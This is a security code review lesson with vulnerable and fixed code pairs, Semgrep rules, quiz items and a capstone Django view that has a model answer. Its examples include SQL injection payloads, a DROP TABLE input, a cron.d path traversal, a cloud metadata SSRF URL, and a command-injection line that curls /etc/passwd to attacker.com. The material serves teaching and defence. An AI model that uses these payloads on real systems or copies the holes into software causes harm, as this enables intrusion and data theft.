Security
Code Review

Security code review is the systematic examination of source code to find vulnerabilities that automated tools miss: business logic flaws, authentication bypasses, second-order injection, insecure data flows, and subtle race conditions. A good security reviewer thinks like an attacker while reading code. This lesson gives you a systematic process, a vulnerability taxonomy for code review, the specific patterns to look for in each category, and a triage model for communicating findings effectively.

🟢 Beginner — Process & Mindset
How to approach a security code review
Security code review is not the same as quality code review. The goal is not to find bugs or style issues — it is to find paths through which an attacker can cause harm. That requires a different mental model.
The security review process — 5 phases
From scope to findings: a repeatable approach
▼
PhaseWhat you doOutput
1. ContextUnderstand what the code does, what data it handles, who the users are, and what the trust model is. Read the spec, not just the code.Threat actor list, data sensitivity classification, trust boundary diagram
2. Entry pointsIdentify every way untrusted data enters the system: HTTP parameters, headers, cookies, file uploads, message queues, webhooks, database values read back, environment variables.Data flow map: untrusted data sources → sinks
3. Systematic scanFor each vulnerability category relevant to this code: look for the pattern. Use the checklist. Don't just read sequentially — hunt specific patterns.Raw findings list with file/line references
4. Verify exploitabilityFor each candidate finding: can this actually be exploited? What is the attack chain? Is there a compensating control elsewhere that would prevent it?Verified findings with PoC or explanation
5. ReportWrite findings in developer-actionable format: what is the vulnerability, where is it, what is the attack scenario, and what specifically should be changed.Findings report with severity, location, and specific remediation

The attacker's question

For every piece of code, ask: "What happens if an attacker controls this value?" Trace the value from its source (HTTP parameter, database read, external API response) through every transformation and decision point to its final use (SQL query, filesystem operation, HTML output, command execution). If the attacker controls the final use without adequate validation, that is a finding.

Writing an actionable finding

finding template
## Finding: SQL Injection in Product Search
Severity: CRITICAL
File: app/views/products.py, line 42
CWE: CWE-89 (SQL Injection)

### Vulnerability
The `keyword` parameter from the HTTP request is directly interpolated
into a SQL query without sanitization or parameterization.

### Vulnerable code
query = f"SELECT * FROM products WHERE name LIKE '%{keyword}%'"
db.execute(query)

### Attack scenario
An attacker sends: GET /api/products?keyword=' UNION SELECT password FROM users--
The server executes: SELECT * FROM products WHERE name LIKE '%' UNION SELECT...
Result: all user passwords returned in the product listing.

### Proof of concept
curl "https://api.example.com/products?keyword=%27%20UNION%20SELECT%20password%20FROM%20users--"

### Fix
Use parameterized queries:
query = "SELECT * FROM products WHERE name LIKE %s"
db.execute(query, (f"%{keyword}%",))
### References
OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
🟡 Intermediate — Vulnerability Patterns to Look For
What to hunt in a security code review
Each card below covers a vulnerability class: the code pattern to look for, a real example with vulnerable and fixed code, and what SAST misses that human review catches. Click to expand.
Injection & Data Flow
SQLi, CMDi, Path Traversal, XXE • CWE-89, CWE-78
Pattern to hunt

Trace untrusted input from its source (request params, headers, file content) to any function that executes it (db.execute, subprocess.run, os.system, open(), lxml.etree.parse). Look for string concatenation or f-strings at the call site.

# SQLi: f-string in query
q = f"SELECT * FROM users WHERE name='{name}'"
q = "SELECT * FROM users WHERE name=%s" ; db.execute(q,(name,))

# Path traversal: unsanitised file open
open(f"/var/data/{filename}")
safe = os.path.basename(filename)
open(os.path.join("/var/data", safe))

# Command injection via subprocess
subprocess.run(f"convert {user_file} output.png", shell=True)
subprocess.run(["convert", user_file, "output.png"])

# What SAST misses: second-order injection
# Value stored to DB here (looks clean to SAST)
db.execute("INSERT INTO prefs VALUES (%s)", (username,))
# ...then read back later and used unsafely (SAST doesn't track this)
name = db.get("SELECT name FROM prefs WHERE id=%s", (id,))
os.system(f"notify {name}")   # CMDi via stored value
Broken Access Control & BOLA
OWASP A01 • CWE-284, CWE-639
Pattern to hunt

Look for any database query or object lookup that uses a user-supplied ID without also checking ownership. The check at the endpoint level is not enough — verify the ownership check is on every path that returns sensitive data.

# BOLA: lookup by ID with no ownership check
order = Order.objects.get(id=order_id)   # any user can get any order
order = Order.objects.get(id=order_id, user=request.user)

# Privilege escalation: role check only on some paths
if request.method == 'GET':
    return User.objects.get(id=user_id)  # no role check on reads!
if request.method == 'POST':
    if not request.user.is_staff: raise PermissionDenied

# Function level: admin feature accessible by all users
def export_all_users(request):           # no @login_required or role check
    return User.objects.all().values()

# What SAST misses: BOLA requires understanding the data model
# SAST cannot tell if Order.objects.get(id=x) should filter by user
# That requires understanding the business logic
Authentication & Session Flaws
JWT issues, password storage, session fixation • CWE-287
Pattern to hunt

JWT: check algorithm enforcement and key confusion. Passwords: check hash algorithm (bcrypt/argon2 vs md5/sha1). Sessions: check fixation, timeout, and revocation on logout. Token storage: localStorage (bad) vs httpOnly cookie (good).

# JWT: algorithm: none attack — never accept 'none'
payload = jwt.decode(token, SECRET, algorithms=["HS256", "none"])
payload = jwt.decode(token, SECRET, algorithms=["HS256"])

# JWT: no audience check — token for service A works on service B
payload = jwt.decode(token, PUB_KEY, algorithms=["RS256"])
payload = jwt.decode(token, PUB_KEY, algorithms=["RS256"],
                     audience="https://api.myapp.com")

# Weak password hash
hashed = hashlib.md5(password.encode()).hexdigest()
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# Password comparison: timing attack vulnerability
if stored_hash == input_hash:           # early exit reveals hash length
if hmac.compare_digest(stored_hash, input_hash):  # constant time

# Session fixation: must regenerate session ID on login
request.session['user_id'] = user.id    # old session ID reused
request.session.cycle_key()             # new session ID, copy data
request.session['user_id'] = user.id
Cryptography Mistakes
Weak algorithms, IV reuse, CBC padding oracle • CWE-327, CWE-330
Pattern to hunt

Look for: MD5/SHA1 for security (use SHA-256+). DES/3DES/RC4/ECB mode (use AES-256-GCM). Hardcoded IV or nonce reuse. Random number generated with random not secrets module. PRNG seeds that are predictable.

# Weak hash for security purpose
token = hashlib.md5(user_id + timestamp).hexdigest()
token = secrets.token_hex(32)           # cryptographically random

# ECB mode: blocks encrypted independently, patterns visible
cipher = AES.new(key, AES.MODE_ECB)
cipher = AES.new(key, AES.MODE_GCM)    # authenticated encryption

# IV reuse: same IV with same key = catastrophic
IV = b'\x00' * 16                       # constant IV
IV = secrets.token_bytes(16)            # random IV per message

# Non-cryptographic random for security token
import random
token = str(random.randint(100000, 999999))  # predictable with seed
import secrets
token = secrets.token_urlsafe(32)            # CSPRNG

# Insecure key derivation
key = hashlib.sha256(password.encode()).digest()   # no salt, no iterations
key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000)
Business Logic & Race Conditions
Time-of-check vs time-of-use, double-spend, state machine violations
Pattern to hunt

These are the vulnerabilities SAST almost never finds. They require understanding the business intent. Look for: read-then-write sequences that should be atomic. State transitions that skip steps. Limits checked before rather than during a transaction. Parallel request exploitation paths.

# TOCTOU race: balance checked then deducted separately
balance = get_balance(user_id)          # read
if balance >= amount:                   # check
    deduct(user_id, amount)             # two concurrent requests both pass the check

# Fix: atomic database operation with SELECT FOR UPDATE
with transaction.atomic():
    acct = Account.objects.select_for_update().get(user=user_id)
    if acct.balance >= amount:
        acct.balance -= amount
        acct.save()

# State machine bypass: can jump directly to final state
order.status = 'delivered'              # no check that previous state was 'shipped'
order.save()

VALID_TRANSITIONS = {
    'pending': ['paid'],
    'paid': ['shipped'],
    'shipped': ['delivered'],
}
if new_status not in VALID_TRANSITIONS.get(order.status, []):
    raise ValueError(f"Invalid transition: {order.status} -> {new_status}")

# Limit bypass: integer overflow or negative amount
if withdraw_amount > 0:                 # doesn't check maximum
    process_withdrawal(withdraw_amount)
if 0 < withdraw_amount <= MAX_WITHDRAWAL:
    process_withdrawal(withdraw_amount)
Insecure Deserialization & SSRF
RCE via pickle, SSRF via URL fetch • CWE-502, CWE-918
Pattern to hunt

Deserialization: look for pickle.loads(), yaml.load() (not safe_load), PHP unserialize(), or Java ObjectInputStream on untrusted data. SSRF: look for URL-fetch functions (requests.get, urllib, fetch) where the URL comes from user input.

# Insecure deserialization: pickle with user data = RCE
data = pickle.loads(base64.b64decode(request.POST['payload']))
# Fix: never deserialize untrusted data with pickle
data = json.loads(request.POST['payload'])  # safe: json cannot execute code

# YAML: load() is dangerous, safe_load() is safe
config = yaml.load(user_content)            # can execute Python via !!python/object
config = yaml.safe_load(user_content)       # restricts to primitive types only

# SSRF: user controls the URL being fetched
url = request.GET['webhook']
resp = requests.get(url)    # attacker sends: http://169.254.169.254/latest/meta-data/

# Fix: allowlist permitted domains, block internal ranges
from urllib.parse import urlparse
parsed = urlparse(url)
if parsed.hostname not in ALLOWED_WEBHOOK_HOSTS:
    raise ValueError("Webhook domain not permitted")
if parsed.hostname in ('169.254.169.254', 'metadata.google.internal'):
    raise ValueError("Internal addresses not permitted")

# What SAST misses: SSRF with redirects
# Initial URL is safe, but server redirects to metadata endpoint
# Must follow redirects and re-validate at each hop
🔴 Advanced — Efficient Review at Scale
Reviewing code fast without missing what matters
A full manual security review of every PR is not feasible at scale. The advanced practice is combining automated scanning with targeted manual review, writing custom rules for your codebase, and building developer-facing security culture.

Writing custom Semgrep rules for your codebase
Teaching your SAST tool about your application's specific security patterns
▼

Generic Semgrep rules catch generic vulnerability patterns. But your codebase has patterns specific to it: your ORM's unsafe query method, your internal serialization library, your framework's dangerous config. Writing custom rules encodes your security knowledge so it runs automatically on every PR without a human reviewer needing to remember to check.

.semgrep/custom-rules.yml
rules:
  # Rule 1: Flag our legacy raw_query() function
  - id: unsafe-raw-query
    pattern: db.raw_query($QUERY, ...)
    message: >
      raw_query() bypasses the ORM parameterization.
      Use db.safe_query() instead, or the ORM QuerySet API.
    languages: [python]
    severity: ERROR

  # Rule 2: Detect direct use of user input in redirect URL
  - id: open-redirect
    patterns:
      - pattern: return redirect($URL)
      - pattern-either:
          - pattern-inside: |
              $URL = request.GET.get(...)
              ...
          - pattern-inside: |
              $URL = request.POST.get(...)
              ...
    message: >
      Potential open redirect: redirect URL comes from user input.
      Validate URL is relative or in an allowlist of trusted domains.
    languages: [python]
    severity: WARNING

  # Rule 3: Ensure our admin views have the decorator
  - id: admin-view-missing-decorator
    patterns:
      - pattern: |
          def $FUNC(request, ...):
            ...
      - pattern-not: |
          @require_admin
          def $FUNC(request, ...):
            ...
    paths:
      include: ["*/admin/views.py", "*/admin/api.py"]
    message: "Admin view $FUNC is missing @require_admin decorator"
    languages: [python]
    severity: ERROR

  # Rule 4: Flag deserialization of user data
  - id: unsafe-pickle-load
    pattern-either:
      - pattern: pickle.loads(request.$METHOD(...))
      - pattern: pickle.loads($X) where $X <- request
    message: "Never deserialize user input with pickle. Use json.loads()."
    languages: [python]
    severity: ERROR

Knowledge Check
Code review interview questions
Q1. You are reviewing code that reads a serialized object from a Redis cache and calls pickle.loads() on it. The reviewer before you left a comment: "Safe because this comes from our own Redis, not from the user." Is this assessment correct?
Correct — internal caches are trusted data sources
Incorrect. Cache poisoning is an established attack technique: if an attacker can write to Redis (via SSRF, via an injection in another service that writes to Redis, or via a Redis misconfiguration), they control the deserialized data. pickle.loads() on any externally influenced data — even "internal" — can execute arbitrary Python. The fix is to never store pickle data in Redis; use JSON for all cached data.
Correct, but only if Redis has authentication enabled
Incorrect only because Redis can be accessed from the network
The "it comes from our infrastructure, not from the user" reasoning is the implicit trust anti-pattern. Redis is an internal service — but it can be written to by other services, by SSRF attacks, by other deserialization vulnerabilities elsewhere, or by Redis misconfiguration. Once data flows through an intermediary, you cannot guarantee its integrity at deserialization time without additional integrity checks. The correct rule: pickle.loads() on any value you did not generate in the current execution context is dangerous. This includes Redis, database LOB columns, file systems, and message queues. Use JSON (or msgpack for binary efficiency) for all inter-service data exchange. If you genuinely need Python-specific types, sign the pickle data with HMAC before storing and verify before loading.
Q2. During a code review you see a bank transfer endpoint that: (1) reads the user's current balance, (2) checks if balance >= transfer amount, (3) deducts the amount, (4) credits the recipient. What security vulnerability is present and how would you exploit it?
SQL injection in the balance lookup query
Missing authentication on the transfer endpoint
TOCTOU (Time-of-Check Time-of-Use) race condition. Exploit: send 10 concurrent transfer requests simultaneously, each for the full balance. All 10 read the balance before any of them deduct it, all 10 pass the balance check, and all 10 execute the deduction — overdrafting the account by 10x. Fix: wrap the read-check-deduct in a database transaction with SELECT FOR UPDATE, which locks the row and forces serial execution. Or use an atomic UPDATE with a WHERE clause checking the balance: UPDATE accounts SET balance = balance - amount WHERE id = X AND balance >= amount (affected rows = 0 means insufficient funds).
Cross-site request forgery on the transfer form
The race condition (TOCTOU) is a classic business logic vulnerability that SAST tools almost never catch because the code looks correct at each individual step — the bug is in the relationship between steps across concurrent requests. The attack is straightforward: send many concurrent requests, all for the full balance. With a non-atomic implementation, many of them will read the same pre-deduction balance and each will pass the check. The atomic fix: wrap in a database transaction with SELECT FOR UPDATE (Postgres/MySQL), which acquires a row lock so the second concurrent request blocks until the first commits. The alternative is an atomic conditional UPDATE: UPDATE accounts SET balance = balance - $amount WHERE user_id = $id AND balance >= $amount. If this affects zero rows, the balance was insufficient. This is unraceable because it is a single atomic DB operation.
Capstone Challenge — Review This Code

Find all security issues in this Django view

Below is a Django view function for a financial application. Find every security vulnerability, name the class, write the attack scenario, and provide the fixed code.

import pickle, hashlib, subprocess
from django.http import JsonResponse
from django.db import connection

def transfer_funds(request):
    user_id = request.POST.get('user_id')
    amount  = request.POST.get('amount')
    to_acct = request.POST.get('to_account')
    note    = request.POST.get('note', '')

    # Load user preferences from cache
    prefs = pickle.loads(request.COOKIES.get('user_prefs', b''))

    # Log the transfer
    log_path = f"/var/log/transfers/{user_id}.log"
    subprocess.run(f"echo '{note}' >> {log_path}", shell=True)

    # Check balance
    with connection.cursor() as cur:
        cur.execute(f"SELECT balance FROM accounts WHERE user_id='{user_id}'")
        balance = cur.fetchone()[0]

    if float(balance) >= float(amount):
        with connection.cursor() as cur:
            cur.execute(f"UPDATE accounts SET balance=balance-{amount}
                         WHERE user_id='{user_id}'")
            cur.execute(f"UPDATE accounts SET balance=balance+{amount}
                         WHERE user_id='{to_acct}'")

    # Generate receipt token
    token = hashlib.md5(f"{user_id}{amount}{to_acct}".encode()).hexdigest()
    return JsonResponse({'status': 'ok', 'token': token})

Model Answer — Security Issues in transfer_funds()

Issue 1 — Insecure Deserialization (CRITICAL, CWE-502): pickle.loads() on a cookie value the user controls directly. Exploit: craft a malicious pickle payload, base64-encode it, set it as the user_prefs cookie. On next request, Django deserializes it, executing arbitrary Python code as the web application user. Fix: never store serialized Python objects in cookies. Use JSON. If state needs to persist, store it server-side (in session or DB), not in a client-side cookie.

Issue 2 — Command Injection (CRITICAL, CWE-78): The note variable is interpolated into a shell command with shell=True. Exploit: note = "; curl http://attacker.com/exfil?data=$(cat /etc/passwd)" — this terminates the echo command and runs a second shell command. Fix: use subprocess.run(["tee", "-a", log_path], input=note.encode()) with shell=False. Validate the note value. Alternatively, write to the log file using Python's built-in logging module, not subprocess.

Issue 3 — SQL Injection x2 (CRITICAL, CWE-89): Both the SELECT and UPDATE queries use f-string interpolation of user_id, amount, and to_acct. Exploit on SELECT: user_id = "' OR '1'='1" returns all balances. Exploit on UPDATE: user_id = "x'; DROP TABLE accounts;--". Fix: use parameterised queries: cur.execute("SELECT balance FROM accounts WHERE user_id=%s", (user_id,)) and similarly for both UPDATEs.

Issue 4 — Race Condition / TOCTOU (CRITICAL): Balance is checked in one query and deducted in a separate query. Two concurrent transfer requests both read the same balance, both pass the check, both deduct. Fix: use SELECT FOR UPDATE inside a transaction: with transaction.atomic(): cur.execute("SELECT balance FROM accounts WHERE user_id=%s FOR UPDATE", (user_id,)) — this locks the row for the duration of the transaction. Or use an atomic conditional UPDATE and check affected rows.

Issue 5 — Missing Authentication (CRITICAL): No @login_required decorator and no check that the authenticated user matches user_id. Any unauthenticated request can transfer funds from any account. Fix: add @login_required. Verify request.user.id == int(user_id) or raise PermissionDenied. The transfer should use request.user as the source, not a user-supplied user_id.

Issue 6 — Weak Receipt Token (HIGH, CWE-327): MD5 of user_id + amount + to_acct is a predictable, forgeable token. MD5 is broken for security purposes, and the inputs are known/guessable. Fix: use secrets.token_hex(32) for a cryptographically random receipt token, store it in the database with the transaction record, and return it to the user.

Issue 7 — Path Traversal in Log Path (HIGH, CWE-22): user_id is concatenated into the file path without validation. Exploit: user_id = "../../etc/cron.d/backdoor" writes to the cron directory. Fix: validate user_id is a valid integer before use. Use os.path.basename() and restrict to a known safe directory. Better: use Python's logging module, not file paths from user input.

Issue 8 — No Input Validation on Amount (HIGH): amount is taken from POST data and cast to float with no validation. Exploit: amount = "-1000" — negative transfer amount increases the source account balance. amount = "999999999999" — no maximum check. Fix: validate that amount is a positive decimal within policy limits before processing.
